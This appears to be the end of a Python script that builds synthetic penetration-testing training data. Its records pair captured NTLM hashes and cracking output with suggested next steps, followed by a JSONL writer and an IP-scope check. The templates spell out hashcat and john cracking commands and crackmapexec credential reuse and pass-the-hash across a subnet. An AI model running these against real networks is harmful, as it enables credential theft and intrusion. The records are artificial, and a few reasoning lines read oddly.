            "[+] [MDNS] Poisoned answer sent to 10.10.0.8  for name server-auth [</>]\n"
            "[+] [SMB] NTLMv2-SSP Client   : 10.10.0.8\n"
            "[+] [SMB] NTLMv2-SSP Username : FINANCE\\\\mwalter\n"
            "[+] [SMB] NTLMv2-SSP Hash     : mwalter::FINANCE:aaaabbbb...:11223344...:0123456789abcdef\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. Captured an NTLMv2 hash for `mwalter` - that's crackable offline and far better "
            "than plaintext-bruting online.\n"
            "2. NTLMv2 is slow to crack, but the account name gives a target to spray with any "
            "success.\n"
            "3. I should stop posing before line-noise drowns the good hash.\n"
            " response\n\n"
            "**Priority**: crack the captured NTLMv2 hash off-box:\n\n"
            "```bash\n"
            "hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt --potfile-path ntlmv2.pot\n"
            "```\n\n"
            "Between tasks, if cracked, `crackmapexec smb 10.10.0.0/24 -u mwalter -p <cracked>` to test reuse."
        ),
        "cve": [],
    },
    # ------------------------- john / hashcat status (2 cases) ------------------------- #
    {
        "tool": "john", "case": "cracked_ntlm",
        "instruction": (
            "[scope: authorized] I ran `john --format=nt ntlm.txt --wordlist=rockyou.txt` and got:\n\n"
            "Loaded 3 password hashes with 3 different salts (NT [MD4 32/64])\n"
            "Summer2024!     (mwalter)\n"
            "1g 0:00:00:04 0.25g/s 33.7p/s\n"
            "Use the \"--show\" option to display all of the cracked passwords\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. `mwalter`'s NT hash cracked as `Summer2024!` - a real credential, dated and "
            "weak-looking.\n"
            "2. NT hash = plaintext-equivalent for NTLM auth, so I can pass-the-hash even before "
            "confirming the plaintext works.\n"
            "3. Immediately test reuse across SMB/WinRM and note it for the report.\n"
            " response\n\n"
            "**Priority**: validate the credential against network auth (pass-the-hash too):\n\n"
            "```bash\n"
            "crackmapexec smb 10.10.0.0/24 -u mwalter -H <hash> --shares\n"
            "```\n\n"
            "Between tasks, `john --show --format=nt ntlm.txt` to log the full cracked set."
        ),
        "cve": [],
    },
    {
        "tool": "hashcat", "case": "exhausted_wordlist",
        "instruction": (
            "[scope: authorized] I ran `hashcat -m 5600 ntlmv2.txt rockyou.txt` and got:\n\n"
            "Session..........: hashcat\n"
            "Status...........: Exhausted\n"
            "Hash.Target......: File (ntlmv2.txt)\n"
            "0/1 Hashes recovered.\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. Exhausted the wordlist with 0 recovered - the password isn't in that list.\n"
            "2. NTLMv2 is slow and hard; words only help if the password is common.\n"
            "3. Upgrade the attack: rules/mangling, or switch to the faster NT hash if I can "
            "re-derive it (from a DCSync/other capture).\n"
            " response\n\n"
            "**Priority**: escalate cracking with rules before giving up:\n\n"
            "```bash\n"
            "hashcat -m 5600 ntlmv2.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n"
            "```\n\n"
            "Between tasks, hunt for an NT (MD4) hash capture which cracks far faster than NTLMv2."
        ),
        "cve": [],
    },
]



# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
def main() -> None:
    PROCESSED.mkdir(parents=True, exist_ok=True)

    records: List[Dict[str, Any]] = []
    for tpl in TOOL_OUTPUT_TEMPLATES:
        instruction = sanitize_target(tpl["instruction"])
        output = sanitize_target(tpl["output"])
        records.append({
            "instruction": instruction,
            "output": output,
            "metadata": {
                "source_type": "cyber_terminal_reading",
                "lane": "A_terminal_reading",
                "scope": "authorized",
                "tool": tpl["tool"],
                "case": tpl["case"],
                "cve": tpl.get("cve", []),
                "quality_tier": "P0",
                "license": "Apache-2.0",
                "id": str(uuid.uuid4()),
            },
        })

    out_path = PROCESSED / "training-data-cyber-terminal-reading.jsonl"
    with open(out_path, "w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")

    # ---- Safety sweep ----
    leaked = 0
    for r in records:
        blob = json.dumps(r)
        for m in _IPV4_RE.findall(blob):
            if not any(m.startswith(p) for p in SAFE_NET_PREFIXES):
                leaked += 1
    print(f"Unauthorized-target leak check: {leaked} leaks (0 expected)")

    # ---- Stats ----
    from collections import Counter
    by_tool = Counter(r["metadata"]["tool"] for r in records)
    print(f"\nRows: {len(records)}")
    print("By tool:", dict(by_tool))
    print(f"\nWrote: {out_path}")


if __name__ == "__main__":
    main()

